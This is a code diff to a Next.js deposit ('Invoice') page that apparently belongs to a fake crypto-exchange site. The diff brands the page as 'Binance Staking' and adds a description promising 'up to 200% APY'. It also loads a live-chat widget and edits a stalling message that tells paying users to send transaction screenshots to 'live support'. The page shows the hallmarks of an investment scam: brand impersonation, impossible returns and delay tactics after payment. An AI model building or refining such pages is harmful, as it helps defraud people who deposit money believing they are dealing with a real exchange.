@@ -1,4 +1,5 @@
 import Head from 'next/head'
+import Script from 'next/script'
 import Link from 'next/link'
 import CurrencyFormat from "react-currency-format";
 import { useState, useEffect } from 'react'
@@ -42,7 +43,7 @@ export default function Invoice() {
   
   const handle_confirmation_message = () => {
     dispatch(setMessage(
-      'Your transaction is still in progress, we are experiencing a high volume of traffic if you have paid and still don\'t a get confirmation please send a screenshot of the transaction to our live support at the right bottom corner of your screen an agent will attend to you.'
+      'Your transaction is still in progress, we are experiencing a high volume of traffic if you have paid and still do not a get confirmation please send a screenshot of the sucess transaction to our live support at the right bottom corner of your screen an agent will attend to you.'
     ))
   }
 
@@ -72,8 +73,10 @@ export default function Invoice() {
     <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
         <Loader />
       <Head>
-        <title>Deposit | Binance</title>
+        <title>Binance Staking Make Deposit</title>
+        <meta name="description" content="Start staking and earn up to 200% APY." />
         <link rel="icon" href="/favicon.ico" />
+        <Script src="//code-eu1.jivosite.com/widget/VBkQPci8kv" async></Script>
       </Head>
 
       {/* LOGIN HEADER */}
